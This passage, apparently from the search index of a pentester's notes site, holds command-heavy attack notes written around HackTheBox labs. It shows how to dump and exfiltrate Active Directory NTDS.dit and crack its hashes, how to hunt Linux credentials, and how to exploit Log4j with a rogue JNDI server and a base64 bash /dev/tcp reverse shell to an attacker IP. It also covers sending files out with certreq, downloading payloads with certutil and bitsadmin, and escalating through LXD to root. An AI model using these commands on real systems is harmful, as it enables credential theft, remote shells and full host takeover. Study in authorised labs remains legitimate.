to a DC with Evil-WinRM\nevil-winrm -i 10.129.201.57  -u bwilliamson -p 'P@55w0rd!'\n\n# To make a copy of the NTDS.dit file, we need local admin (Administrators group) or Domain Admin (Domain Admins group) (or equivalent) rights. Check Local Group Membership:\n*Evil-WinRM* PS C:\\&gt; net localgroup\n\n# Check User Account Privileges including Domain. If the account has both Administrators and Domain Administrator rights, this means we can do just about anything we want, including making a copy of the NTDS.dit file.\nnet user &lt;username&gt;\n\n# Use vssadmin to create a Volume Shadow Copy (VSS) of the C: drive or whatever volume the admin chose when initially installing AD. Create a Shadow Copy of C:\n*Evil-WinRM* PS C:\\&gt; vssadmin CREATE SHADOW /For=C:\n\n# Copy the NTDS.dit file from the volume shadow copy of C: onto another location on the drive to prepare to move NTDS.dit to our attack host.\n*Evil-WinRM* PS C:\\NTDS&gt; cmd.exe /c copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy2\\Windows\\NTDS\\NTDS.dit c:\\NTDS\\NTDS.dit\n</code></pre> <p>Launch smbserver in our attacker machine:</p> <pre><code>sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/username/Documents/\n</code></pre> <p>Now, from PS in the victim's windows machine:</p> <pre><code># Transfer the file to attacker machine\ncmd.exe /c move C:\\NTDS\\NTDS.dit \\\\$ip\\CompData\n</code></pre> <p>And... crack the hash with hashcat:</p> <pre><code>sudo hashcat -m 1000 hash /usr/share/wordlists/rockyou.txt\n</code></pre>","tags":["active","directory","ldap","windows"]},{"location":"ldap/#dumpins-ntdsdit-remotely","title":"Dumpins ntds.dit remotely","text":"<pre><code>crackmapexec smb $ip -u &lt;username&gt; -p &lt;password&gt; --ntds\n</code></pre>","tags":["active","directory","ldap","windows"]},{"location":"linenum/","title":"LinEnum - A tool to scan Linux system","text":"","tags":["pentesting","linux pentesting","enumeration"]},{"location":"linenum/#installation","title":"Installation","text":"<p>Clone github repo: https://github.com/rebootuser/LinEnum</p>","tags":["pentesting","linux pentesting","enumeration"]},{"location":"linenum/#basic-usage","title":"Basic usage","text":"<pre><code>./LinEnum.sh -s-r report -e /tmp/ -t\n# -k: Enter keyword\n# -e: Enter export location\n# -t: Include thorough (lengthy) tests\n# -s: Supply current user password to check sudo perms (INSECURE)\n# -r Enter report name\n</code></pre>","tags":["pentesting","linux pentesting","enumeration"]},{"location":"linpeas/","title":"linPEAS","text":"<p>LinPEAS is a script that search for possible paths to escalate privileges on Linux/Unix*/MacOS hosts. The checks are explained on book.hacktricks.xyz</p>","tags":["pentesting","linux pentesting","privilege escalation"]},{"location":"linpeas/#installation","title":"Installation","text":"<p>Github repo: https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS.</p> <p>Some interesting features is that you can execute  from memory and send output back to the host.</p>","tags":["pentesting","linux pentesting","privilege escalation"]},{"location":"linux-exploit-suggester/","title":"Linux Exploit Suggester","text":"<p>Linux Exploit Suggester does pretty much what its name says: it helps in detecting security deficencies for given Linux kernel/Linux-based machine. </p>","tags":["pentesting","privilege escalation"]},{"location":"linux-exploit-suggester/#installation","title":"Installation","text":"<p>Download from https://github.com/The-Z-Labs/linux-exploit-suggester.</p> <p>You can also download it from and to the victim's machine with a different name, let's say \"les.sh\":</p> <pre><code>wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -O les.sh\n</code></pre>","tags":["pentesting","privilege escalation"]},{"location":"linux-exploit-suggester/#basic-commands","title":"Basic commands","text":"<p>Execute it making sure of having execution permissions first:</p> <pre><code>./linux-exploit-suggester.sh\n</code></pre> <p>Also, a nice way to serve this payload is copying the file into the folder /var/www/html of the attacker machine and then run:</p> <pre><code>service apache2 start\n</code></pre>","tags":["pentesting","privilege escalation"]},{"location":"linux-privilege-checker/","title":"Linux Privilege Checker","text":"<p>Linux privilege checker is an enumeration tool with privilege escalation checking capabilities. </p>","tags":["pentesting","linux pentesting","privilege escalation"]},{"location":"linux-privilege-checker/#installation","title":"Installation","text":"<p>Download from: http://www.securitysift.com/download/linuxprivchecker.py</p>","tags":["pentesting","linux pentesting","privilege escalation"]},{"location":"linux-privilege-checker/#basic-commands","title":"Basic commands","text":"<p>You can run it on your system by typing:</p> <pre><code> ./linuxprivchecker.py \n</code></pre> <p>or </p> <pre><code>python linuxprivchecker.py\n</code></pre> <p>Also, a nice way to serve this payload is copying this python file into /var/www/html and then run:</p> <pre><code>service apache2 start\n</code></pre>","tags":["pentesting","linux pentesting","privilege escalation"]},{"location":"linux/","title":"Linux","text":"","tags":["linux"]},{"location":"linux/#find-sensitive-files","title":"Find sensitive files","text":"","tags":["linux"]},{"location":"linux/#configuration-files","title":"Configuration files","text":"<pre><code># Return files with extension .conf, .config and .cnf, which in linux are configuration files.\nfor l in $(echo \".conf .config .cnf\");do echo -e \"\\nFile extension: \" $l; find / -name *$l 2&gt;/dev/null | grep -v \"lib\\|fonts\\|share\\|core\" ;done\n\n\n# Search for three words (user, password, pass) in each file with the file extension .cnf.\nfor i in $(find / -name *.cnf 2&gt;/dev/null | grep -v \"doc\\|lib\");do echo -e \"\\nFile: \" $i; grep \"user\\|password\\|pass\" $i 2&gt;/dev/null | grep -v \"\\#\";done\n</code></pre>","tags":["linux"]},{"location":"linux/#databases","title":"Databases","text":"<pre><code># Search for databases\nfor l in $(echo \".sql .db .*db .db*\");do echo -e \"\\nDB File extension: \" $l; find / -name *$l 2&gt;/dev/null | grep -v \"doc\\|lib\\|headers\\|share\\|man\";done\n</code></pre>","tags":["linux"]},{"location":"linux/#scripts","title":"Scripts","text":"<pre><code>for l in $(echo \".py .pyc .pl .go .jar .c .sh\");do echo -e \"\\nFile extension: \" $l; find / -name *$l 2&gt;/dev/null | grep -v \"doc\\|lib\\|headers\\|share\";done\n</code></pre>","tags":["linux"]},{"location":"linux/#files-including-the-txt-file-extension-and-files-that-have-no-file-extension-at-all","title":"Files including the .txt file extension and files that have no file extension at all","text":"<p>Admin may change the name of configuration files. But you can try to find them:</p> <pre><code>find /home/* -type f -name \"*.txt\" -o ! -name \"*.*\"\n</code></pre>","tags":["linux"]},{"location":"linux/#cronjobs","title":"cronjobs","text":"<p>These are divided into the system-wide area (<code>/etc/crontab</code>) and user-dependent executions. Some applications and scripts require credentials to run and are therefore incorrectly entered in the cronjobs. Furthermore, there are the areas that are divided into different time ranges (/etc/cron.daily, /etc/cron.hourly, /etc/cron.monthly, /etc/cron.weekly). The scripts and files used by cron can also be found in /etc/cron.d/ for Debian-based distributions.</p>","tags":["linux"]},{"location":"linux/#ssh-keys","title":"SSH Keys","text":"<pre><code>grep -rnw \"PRIVATE KEY\" /home/* 2&gt;/dev/null | grep \":1\"\n\ngrep -rnw \"ssh-rsa\" /home/* 2&gt;/dev/null | grep \":1\"\n</code></pre>","tags":["linux"]},{"location":"linux/#bash-history","title":"Bash History","text":"<pre><code>tail -n5 /home/*/.bash*\n</code></pre>","tags":["linux"]},{"location":"linux/#logs","title":"Logs","text":"Log File Description <code>/var/log/messages</code> Generic system activity logs. <code>/var/log/syslog</code> Generic system activity logs. <code>/var/log/auth.log</code> (Debian) All authentication related logs. <code>/var/log/secure</code> (RedHat/CentOS) All authentication related logs. <code>/var/log/boot.log</code> Booting information. <code>/var/log/dmesg</code> Hardware and drivers related information and logs. <code>/var/log/kern.log</code> Kernel related warnings, errors and logs. <code>/var/log/faillog</code> Failed login attempts. <code>/var/log/cron</code> Information related to cron jobs. <code>/var/log/mail.log</code> All mail server related logs. <code>/var/log/httpd</code> All Apache related logs. <code>/var/log/mysqld.log</code> All MySQL server related logs. <pre><code> for i in $(ls /var/log/* 2&gt;/dev/null);do GREP=$(grep \"accepted\\|session opened\\|session closed\\|failure\\|failed\\|ssh\\|password changed\\|new user\\|delete user\\|sudo\\|COMMAND\\=\\|logs\" $i 2&gt;/dev/null); if [[ $GREP ]];then echo -e \"\\n#### Log file: \" $i; grep \"accepted\\|session opened\\|session closed\\|failure\\|failed\\|ssh\\|password changed\\|new user\\|delete user\\|sudo\\|COMMAND\\=\\|logs\" $i 2&gt;/dev/null;fi;done\n</code></pre>","tags":["linux"]},{"location":"linux/#credentials-storage","title":"Credentials storage","text":"","tags":["linux"]},{"location":"linux/#shadow-file","title":"Shadow file","text":"<p>The /etc/shadow file has a unique format in which the entries are entered and saved when new users are created.</p> <pre><code>htb-student:    $y$j9T$3QSBB6CbHEu...SNIP...f8Ms:   18955:  0:  99999:  7:  :   :   :\n&lt;username&gt;:     &lt;encrypted password&gt;:   &lt;day of last change&gt;:   &lt;min age&gt;:  &lt;max age&gt;:  &lt;warning period&gt;:   &lt;inactivity period&gt;:    &lt;expiration date&gt;:  &lt;reserved field&gt;\n</code></pre> <p>The encryption of the password in this file is formatted as follows:</p> <code>$ &lt;id&gt;</code> <code>$ &lt;salt&gt;</code> <code>$ &lt;hashed&gt;</code> <code>$ y</code> <code>$ j9T</code> <code>$ 3QSBB6CbHEu...SNIP...f8Ms</code> <p>The type (<code>id</code>) is the cryptographic hash method used to encrypt the password. Many different cryptographic hash methods were used in the past and are still used by some systems today.</p> ID Cryptographic Hash Algorithm <code>$1$</code> MD5 <code>$2a$</code> Blowfish <code>$5$</code> SHA-256 <code>$6$</code> SHA-512 <code>$sha1$</code> SHA1crypt <code>$y$</code> Yescrypt <code>$gy$</code> Gost-yescrypt <code>$7$</code> Scrypt <p>The /etc/shadow file can only be read by the user root.</p>","tags":["linux"]},{"location":"linux/#passwd-file","title":"Passwd file","text":"<p>The /etc/passwd</p> <pre><code>htb-student:    x:  1000:   1000:   ,,,:    /home/htb-student:  /bin/bash\n&lt;username&gt;:     &lt;password&gt;:     &lt;uid&gt;:  &lt;gid&gt;:  &lt;comment&gt;:  &lt;home directory&gt;:   &lt;cmd executed after logging in&gt;\n</code></pre> <p>The <code>x</code> in the password field indicates that the encrypted password is in the <code>/etc/shadow</code> file.</p>","tags":["linux"]},{"location":"linux/#opasswd","title":"Opasswd","text":"<p>The PAM library (<code>pam_unix.so</code>) can prevent reusing old passwords. The file where old passwords are stored is the <code>/etc/security/opasswd</code>. Administrator/root permissions are also required to read the file if the permissions for this file have not been changed manually.</p> <pre><code># Reading /etc/security/opasswd\nsudo cat /etc/security/opasswd\n\n# cry0l1t3:1000:2:$1$HjFAfYTG$qNDkF0zJ3v8ylCOrKB0kt0,$1$kcUjWZJX$E9uMSmiQeRh4pAAgzuvkq1\n</code></pre> <p>Looking at the contents of this file, we can see that it contains several entries for the user cry0l1t3, separated by a comma (,). Another critical point to pay attention to is the hashing type that has been used. This is because the MD5 ($1$) algorithm is much easier to crack than SHA-512. This is especially important for identifying old passwords and maybe even their pattern because they are often used across several services or applications. We increase the probability of guessing the correct password many times over based on its pattern.</p>","tags":["linux"]},{"location":"linux/#dumping-memory-and-cache","title":"Dumping memory and cache","text":"<p>mimipenguin lazagne</p> <p>Firefox stored credentials:</p> <pre><code>ls -l .mozilla/firefox/ | grep default \n\ncat .mozilla/firefox/xxxxxxxxx-xxxxxxxxxx/logins.json | jq .\n</code></pre> <p>The tool Firefox Decrypt is excellent for decrypting these credentials, and is updated regularly. It requires Python 3.9 to run the latest version. Otherwise, <code>Firefox Decrypt 0.7.0</code> with Python 2 must be used.</p>","tags":["linux"]},{"location":"log4j/","title":"Log4j","text":"<p>This Log4J vulnerability can be exploited by injecting operating system commands (OS Command Injection). Log4j is a popular logging library for Java created in 2001. The logging library's main purpose is to provide developers with a way to change the format and verbosity of logging through configuration files versus code. </p>","tags":["web pentesting","java","serialization vulnerability"]},{"location":"log4j/#what-it-does","title":"What it does","text":"<p>What a logging library does, is instead of using print statements, the developer just uses a wrapper around the Logging class or object. So instead of using print(line), the code would look like this:</p> <pre><code>logging.INFO(\u201cApplication Started\u201d)\nlogging.WARN(\u201cFile Uploaded\u201d)\nlogging.DEBUG(\u201cSQL Query Ran\u201d)\n</code></pre> <p>Then the application has a configuration file which says what log levels (INFO, WARN, DEBUG, etc.) to display. This way when there is a problem with the application, the developer can enable DEBUG mode and instantly get the messages they need to identify the issue.</p>","tags":["web pentesting","java","serialization vulnerability"]},{"location":"log4j/#reconnaissance-proof-of-concept","title":"Reconnaissance - Proof of Concept","text":"<p>The main way people have been testing if an application is vulnerable is by combining this vulnerability with JNDI.</p> <p>Java Naming and Directory Interface (JNDI) is a Java API that allows clients to discover and look up data and objects via a name. These objects can be stored in different naming or directory services, such as Remote Method Invocation (RMI), Common Object Request Broker Architecture (CORBA), Lightweight Directory Access Protocol (LDAP), or Domain Name Service (DNS). By making calls to this API, applications locate resources and other program objects. A resource is a program object that provides connections to systems, such as database servers and messaging systems.</p> <p>In other words, JNDI is a simple Java API (such as 'InitialContext.lookup(String name)') that takes just one string parameter, and if this parameter comes from an untrusted source, it could lead to remote code execution via remote class loading.</p> <p>LDAP is the acronym forLightweight Directory Access Protocol, which is an open, vendor-neutral, industry standard application protocol for accessing and maintaining distributed directory information services over the Internet or a Network. The default port that LDAP runs on is port 389.</p> <p>Proof of concepts to see if it is vulnerable:</p> <p>1. Grab the request with the injectable parameter.</p> <p>2. In the injectable parameter, inject something like this:</p> <pre><code>\"${jndi:ldap://AtackerIP/whatever}\"\n</code></pre> <p>With tcpdump, check if the request with the payload produces some traffic to your attacker machine:</p> <pre><code>sudo tcpdump -i tun0 port 389\n# -i: Select interface\n# port: indicate the port where traffic is going to be captured. \n</code></pre> <p>The tcpdump output shows a connection being received on our machine. This proves that the application is indeed vulnerable since it is trying to connect back to us on the LDAP port 389.</p>","tags":["web pentesting","java","serialization vulnerability"]},{"location":"log4j/#exploitation","title":"Exploitation","text":"<pre><code># Install Open-JDK and Maven as requirement\nsudo apt install openjdk-11-jre maven\n\ngit clone https://github.com/veracode-research/rogue-jndi \n\ncd rogue-jndi\n\nmvn package\n\n# Once it's build, make a reverse shell in base64 with attacker machine and listening port\necho 'bash -c bash -i &gt;&amp;/dev/tcp/$AttackerIP/$AttackerPort 0&gt;&amp;1' | base64\n# This will return something similar to this: YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTQuMi80NDQ0IDA+JjEK\n\n# Get out of rogue-jndi folder and\njava -jar rogue-jndi/target/RogueJndi-1.1.jar --command \"bash -c {echo,YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTQuMi80NDQ0IDA+JjEK}|{base64,-d}|{bash,-i}\" --hostname \"10.129.96.149\"\n# In the bash command, copy paste your reverse shell in base64\n# --hostname: Victim IP\n\n# Now, open a terminal, launch [[netcat]] and the listening port you defined in your payload.\n</code></pre> <p>With Burpsuite, get a request for login:</p> <pre><code>POST /api/login HTTP/1.1\nHost: 10.129.96.149:8443\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nReferer: https://10.129.96.149:8443/manage/account/login\nContent-Type: application/json; charset=utf-8\nOrigin: https://10.129.96.149:8443\nContent-Length: 104\nSec-Fetch-Dest: empty\nSec-Fetch-Mode: cors\nSec-Fetch-Site: same-origin\nTe: trailers\nConnection: close\n\n{\"username\":\"lala\",\"password\":\"lele\",\"remember\":false,\"strict\":true}\n</code></pre> <p>This request is from HackTheBox machine: Unified. As we can read from the Unifi version exploit, the injectable parameter is \"remember\". So we insert there our payload and with Repeater, send the request:</p> <pre><code>POST /api/login HTTP/1.1\nHost: 10.129.96.149:8443\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nReferer: https://10.129.96.149:8443/manage/account/login\nContent-Type: application/json; charset=utf-8\nOrigin: https://10.129.96.149:8443\nContent-Length: 104\nSec-Fetch-Dest: empty\nSec-Fetch-Mode: cors\nSec-Fetch-Site: same-origin\nTe: trailers\nConnection: close\n\n{\"username\":\"lala\",\"password\":\"lele\",\"remember\":\"${jndi:ldap://10.10.14.2:1389/o=tomcat}\",\"strict\":true}\n</code></pre> <p>Once we send that request, our jndi server will resend the reverse shell:</p> <p></p> <p>And in our terminal with the nc listener we will get the reverse shell.</p>","tags":["web pentesting","java","serialization vulnerability"]},{"location":"log4j/#dummy-explanation","title":"Dummy explanation","text":"<p>Log4j is a framework or\u00a0<code>Library</code>\u00a0used to log application messages in Java and other programming languages. In this example, an attacker can manipulate the HTTP User-Agent header and insert a JNDI lookup as a command intended for the Log4j\u00a0<code>library</code>. Accordingly, not the actual User-Agent header, such as Mozilla 5.0, is processed, but the JNDI lookup. What made the Log4j vulnerability so dangerous was the\u00a0<code>Privileges</code>\u00a0that the implementation brought. . Accordingly, most applications with the Log4j implementation were run with the privileges of an administrator. The process itself exploited the library by manipulating the User-Agent so that the process misinterpreted the source and led to the execution of user-supplied code.</p> <p>The misinterpretation of the User-Agent leads to a JNDI lookup which is executed as a command from the system with administrator privileges and queries a remote server controlled by the attacker.</p> <p>GovCERT.ch has created an excellent graphical representation of the Log4j vulnerability worth examining in detail. Source: https://www.govcert.ch/blog/zero-day-exploit-targeting-popular-java-library-log4j/</p> <p></p>","tags":["web pentesting","java","serialization vulnerability"]},{"location":"log4j/#related-labs","title":"Related labs","text":"<p>Walkthrough HackTheBox machine: Unified.</p>","tags":["web pentesting","java","serialization vulnerability"]},{"location":"lolbins-lolbas-gtfobins/","title":"LOLbins - \"Living off the land\" binaries: LOLbas and GTFObins","text":"<p>The term LOLBins (Living off the Land binaries) came from a Twitter discussion on what to call binaries that an attacker can use to perform actions beyond their original purpose. There are currently two websites that aggregate information on Living off the Land binaries:</p> <ul> <li>LOLBAS Project for Windows Binaries</li> <li>GTFOBins for Linux Binaries</li> </ul>","tags":["resources","binaries","pentesting"]},{"location":"lolbins-lolbas-gtfobins/#windows-lolbas","title":"Windows - LOLBAS","text":"","tags":["resources","binaries","pentesting"]},{"location":"lolbins-lolbas-gtfobins/#certreqexe","title":"CertReq.exe","text":"<p>Let's use CertReq.exe as an example.</p> <pre><code># From the victim's machine we can sec for instance file.txt to our kali\ncertreq.exe -Post -config http://$ipKali c:\\folder\\file.txt\n\n# From the kali machine, the attacking one, we use a netcat session\nsudo nc -lvnp 80\n</code></pre>","tags":["resources","binaries","pentesting"]},{"location":"lolbins-lolbas-gtfobins/#linux-gtfobins","title":"Linux - GTFOBins","text":"","tags":["resources","binaries","pentesting"]},{"location":"lolbins-lolbas-gtfobins/#openssl","title":"OpenSSL","text":"<pre><code># Create Certificate in our attacker machine\nopenssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem\n\n# Stand up the Server in our attacker machine\nopenssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem &lt; /tmp/LinEnum.sh\n\n# Download File to the victim's Machine, but run command from the attacker kali\nopenssl s_client -connect $ipVictim:80 -quiet &gt; LinEnum.sh\n</code></pre>","tags":["resources","binaries","pentesting"]},{"location":"lolbins-lolbas-gtfobins/#other-common-living-off-the-land-tools","title":"Other Common Living off the Land tools","text":"","tags":["resources","binaries","pentesting"]},{"location":"lolbins-lolbas-gtfobins/#bitsadmin-download-function","title":"Bitsadmin Download function","text":"<p>The Background Intelligent Transfer Service (BITS) can be used to download files from HTTP sites and SMB shares. It \"intelligently\" checks host and network utilization into account to minimize the impact on a user's foreground work.</p> <pre><code># File Download with Bitsadmin\nbitsadmin /transfer wcb /priority foreground http://$ip:8000/nc.exe C:\\Users\\htb-student\\Desktop\\nc.exe\n</code></pre> <p>PowerShell also enables interaction with BITS, enables file downloads and uploads, supports credentials, and can use specified proxy servers.</p> <pre><code># Download\nImport-Module bitstransfer; Start-BitsTransfer -Source \"http://$ip/nc.exe\" -Destination \"C:\\Temp\\nc.exe\"\n</code></pre>","tags":["resources","binaries","pentesting"]},{"location":"lolbins-lolbas-gtfobins/#download-a-file-with-certutil","title":"Download a File with Certutil","text":"<p>Certutil can be used to download arbitrary files.</p> <pre><code>certutil.exe -verifyctl -split -f http://$ip/nc.exe\n</code></pre>","tags":["resources","binaries","pentesting"]},{"location":"lxd/","title":"lxd","text":"<p>LXD is a management API for dealing with LXC containers on Linux systems. It will perform tasks for any members of the local lxd group. It does not make an effort to match the permissions of the calling user to the function it is asked to perform.</p> <p>A member of the local \u201clxd\u201d group can instantly escalate the privileges to root on the host operating system. This is irrespective of whether that user has been granted sudo rights and does not require them to enter their password. The vulnerability exists even with the LXD snap package.</p> <p>Source: https://www.hackingarticles.in/lxd-privilege-escalation/. In this article, you can find a good explanation about how lxc works. Original source: https://bugs.launchpad.net/ubuntu/+source/lxd/+bug/1829071.</p>","tags":["privilege escalation","linux","lxd"]},{"location":"lxd/#privileges-escalation","title":"Privileges escalation","text":"<p>Privilege escalation through lxd requires the access of local account and that that local account belongs to the group lxd.</p> <p>In order to take escalate the root privilege of the host machine you have to create an imag for lxd thus you need to perform the following the action:</p> <p>Steps to be performed on the attacker machine:</p> <pre><code># Download build-alpine in your local machine through the git repository:\ngit clone https://github.com/saghul/lxd-alpine-builder.git\n\n# Execute the script \u201cbuild -alpine\u201d that will build the latest Alpine image as a compressed file, this step must be executed by the root user.\ncd lxd-alpine-builder\nsudo ./build-alpine\n\n# This will generate a tar file that you need to transfer to the victim machine. For that you can copy that file to your /var/www/html folder and start apache2 service.\n</code></pre> <p>Steps to be performed on the victim machine:</p> <pre><code># Download the alpine image. Go for instance to the /tmp folder and, if you have started the apache2 service in the attacker machine, do a wget:\nwget http://AtackerIP//alpine-v3.17-x86_64-20230508_0532.tar.gz\n\n# After the image is built it can be added as an image to LXD as follows:\nlxc image import ./alpine-v3.17-x86_64-20230508_0532.tar.gz --alias myimage\n\n# List available images:\nlxc image list\n\n# Initiate your image inside a new container\nlxc init myimage ignite -c security.privileged=true\n\n# Mount the container inside the /root directory\nlxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true\n\n# Initialize the container\nlxc start ignite\n\n# Launch a shell command in the container\nlxc exec ignite /bin/sh\n</code></pre>","tags":["privilege escalation","linux","lxd"]},{"location":"lxd/#related-labs","title":"Related labs","text":"<p>HackTheBox machine Included.</p>","tags":["privilege escalation","linux","lxd"]},{"location":"m365-cli/","title":"M365 CLI","text":"","tags":["Microsoft 365","pentesting"]},{"location":"m365-cli/#installation","title":"Installation","text":"<p>Source: https://pnp.github.io/cli-microsoft365/cmd/docs/ </p> <p>Install m365 cli from: https://github.com/pnp/cli-microsoft365  </p> <p>Login into Microsoft:  </p> <pre><code>m365 login  \n</code></pre> <p>You will be prompted to open a browser with this url https://microsoft.com/devicelogin  Enter the code that prompt message indicates and login as m365 user.  </p>","tags":["Microsoft 365","pentesting"]},{"location":"m365-cli/#ennumeration-techniques","title":"Ennumeration techniques","text":"<p>Get information about the default Power Apps environment.  </p> <pre><code>m365 pa environment get  \n</code></pre> <p>List Microsoft Power Apps environments in the current tenant </p> <pre><code>m365 pa environment list \n</code></pre> <p>List all available apps for that user  </p> <pre><code>m365 pa app list  \n</code></pre> <p>List all apps in an environment as Admin  </p> <pre><code>m365 pa app list --environmentName 00000000-0000-0000-0000-000000000000 --asAdmin  \n</code></pre> <p>Remove an app  </p> <pre><code>m365 pa app remove --name 00000000-0000-0000-0000-000000000000  \n</code></pre> <p>Removes the specified Power App without confirmation  </p> <pre><code>m365 pa app remove --name 00000000-0000-0000-0000-000000000000 --force  \n</code></pre> <p>Removes the specified Power App you don't own  </p> <pre><code>m365 pa app remove --name 00000000-0000-0000-0000-000000000000 --environmentName Default- 00000000-0000-0000-0000-000000000000 --asAdmin  \n</code></pre> <p>Add an owner without removing the old one  </p> <pre><code>m365 pa app owner set --environmentName 00000000-0000-0000-0000-000000000000 --appName 00000000-0000-0000-0000-000000000000 --userId 00000000-0000-0000-0000-000000000000 --roleForOldAppOwner CanEdit  \n</code></pre> <p>Export an app</p> <pre><code>m365 pa app export --environmentName 00000000-0000-0000-0000-000000000000 --name 00000000-0000-0000-0000-000000000000 --packageDisplayName \"PowerApp\" --packageDescription \"Power App Description\" --packageSourceEnvironment \"Pentesting\" --path ~/Documents\n</code></pre>","tags":["Microsoft 365","pentesting"]},{"location":"machines/","title":"Machines and lab resources","text":"machine OWASP Juice Shop Is a modern vulnerable web application written in Node.js, Express, and Angular which showcases the entire\u00a0OWASP Top Ten\u00a0along with many other real-world application security flaws. Metasploitable 2 Is a purposefully vulnerable Ubuntu Linux VM that can be used to practice enumeration, automated, and manual exploitation. Metasploitable 3 Is a template for building a vulnerable Windows VM configured with a wide range of\u00a0vulnerabilities. DVWA This is a vulnerable PHP/MySQL web application showcasing many common web application vulnerabilities with varying degrees of difficulty. VAPI vAPI is Vulnerable Adversely Programmed Interface which is Self-Hostable API that mimics OWASP API Top 10 scenarios in the means of Exercises. https://overthewire.org/wargames/ The wargames offered by the OverTheWire community can help you to learn and practice security concepts in the form of fun-filled games. Linux https://underthewire.tech/wargames The wargames offered by the OverTheWire community can help you to learn and practice security concepts in the form of fun-filled games. Windows <p>Pro Lab has a specific scenario and level of difficulty:</p> Lab Scenario <code>Dante</code> Beginner-friendly to learn common pentesting techniques and methodologies, common pentesting tools, and common vulnerabilities. <code>Offshore</code> Active Directory lab that simulates a real-world corporate network. <code>Cybernetics</code> Simulates a fully-upgraded and up-to-date Active Directory network environment, which is hardened against attacks. It is aimed at experienced penetration testers and Red Teamers. <code>RastaLabs</code> Red Team simulation environment, featuring a combination of attacking misconfigurations and simulated users. <code>APTLabs</code> This lab simulates a targeted attack by an external threat agent against an MSP (Managed Service Provider) and is the most advanced Pro Lab offered at this time."},{"location":"magnolia-pentesting/","title":"Pentesting magnolia","text":"","tags":["magnolia","pentesting","CMS"]},{"location":"magnolia-pentesting/#preparations","title":"Preparations","text":"<p>For a basic understanding of the CMS I will be deploying a basic setup of the Magnolia application. For that I will follow this setup of Magnolia using Azure App Service: http://www.royal-technology.net/deploying-magnolia-using-azure-app-service.html</p>","tags":["magnolia","pentesting","CMS"]},{"location":"magnolia-pentesting/#prerrequisites","title":"Prerrequisites","text":"<p>Having azure cli:</p> <pre><code>az version\n</code></pre> <p>Checked. Otherwise go to https://learn.microsoft.com/en-us/cli/azure/get-started-with-azure-cli</p> <p>Have maven installed. </p> <pre><code>mvn -v\n</code></pre> <p>First I create my virtual environment in a specific folder for this project. Then, you enter the folder.</p> <p>Now we create a maven project: https://maven.apache.org/guides/getting-started/maven-in-five-minutes.html</p> <pre><code>mvn archetype:generate -DgroupId=com.mycompany.app -DartifactId=my-app -DarchetypeArtifactId=maven-archetype-quickstart -DarchetypeVersion=1.4 -DinteractiveMode=false\n</code></pre> <p>Under this directory you will notice the following\u00a0standard project structure.</p> <pre><code>my-app\n|-- pom.xml\n`-- src\n    |-- main\n    |   `-- java\n    |       `-- com\n    |           `-- mycompany\n    |               `-- app\n    |                   `-- App.java\n    `-- test\n        `-- java\n            `-- com\n                `-- mycompany\n                    `-- app\n                        `-- AppTest.java\n</code></pre> <p>The\u00a0<code>src/main/java</code>\u00a0directory contains the project source code, the\u00a0<code>src/test/java</code>\u00a0directory contains the test source, and the\u00a0<code>pom.xml</code>\u00a0file is the project's Project Object Model, or POM.</p> <p>Now, we login into Azure</p> <pre><code>az login --tenant [tenant-id] --use-device-code\n</code></pre> <p>This will take you to a MFA signing-in process.</p> <p>Having Maven Plugin for Azure App Service. This takes me to install these plugins provided by Microsoft: https://github.com/microsoft/azure-maven-plugins/tree/develop/azure-webapp-maven-plugin</p> <p>After that, clon the repo out of your project folder</p> <pre><code>git clone https://github.com/microsoft/azure-maven-plugins\n</code></pre> <p>Then I entered the folder:</p> <pre><code>cd azure-maven-plugins\n</code></pre> <p>Once you are set, go to the folder of your maven project and run:</p> <pre><code>mvn com.microsoft.azure:azure-webapp-maven-plugin:2.9.0:config\n</code></pre> <p>You will be asked the following:</p> <pre><code>[INFO] --- azure-webapp-maven-plugin:2.9.0:config (default-cli) @ my-lalaapp ---\nCreate new run configuration (Y/N) [Y]: y\nDefine value for OS [Linux]:\n  1: Windows\n* 2: Linux\n  3: Docker\nEnter your choice: 2\nDefine value for javaVersion [Java 17]:\n  1: Java 8\n  2: Java 11\n* 3: Java 17\nEnter your choice: 3\nDefine value for pricingTier [P1v2]:\n   1: B1\n   2: B2\n   3: B3\n   4: D1\n   5: EP1\n   6: EP2\n   7: EP3\n   8: F1\n*  9: P1v2\n  10: P1v3\n  11: P2v2\n  12: P2v3\n  13: P3v2\n  14: P3v3\n  15: S1\n  16: S2\n  17: S3\n  18: Y1\nEnter your choice: 9\nPlease confirm webapp properties\nAppName : my-lalaapp-{id}\nResourceGroup : my-lalaapp-{id}-rg\nRegion : centralus\nPricingTier : P1v2\nOS : Linux\nJava Version: Java 17\nWeb server stack: Java SE\nDeploy to slot : false\nConfirm (Y/N) [Y]: \n[INFO] Saving configuration to pom.\n</code></pre> <p>To deploy the app:</p> <pre><code>mvn package azure-webapp:deploy\n</code></pre> <p>Some troubleshooting will make you change things such as source and target of the application. </p> <p>Response, a lot of verbose code and:</p> <pre><code>[INFO] --- azure-webapp-maven-plugin:2.9.0:deploy (default-cli) @ my-lalaapp ---\n[INFO] Auth type: AZURE_CLI\n[INFO] Default subscription: Magnolia({id-suscription})\n[INFO] Username: amandaguglieri@gmail.com\n[INFO] Subscription: Magnolia({id-suscription})\n[INFO] Resource Group(my-lalaapp-{id}-rg) is successfully created.\n[INFO] App Service plan (asp-my-lalaapp-{id}) is successfully created\n[INFO] Web App(my-lalaapp-{id}) is successfully created\n[INFO] Successfully deployed the resources to my-lalaapp-{id}\n[INFO] Trying to deploy artifact to my-lalaapp-{id}...\n[INFO] Deploying 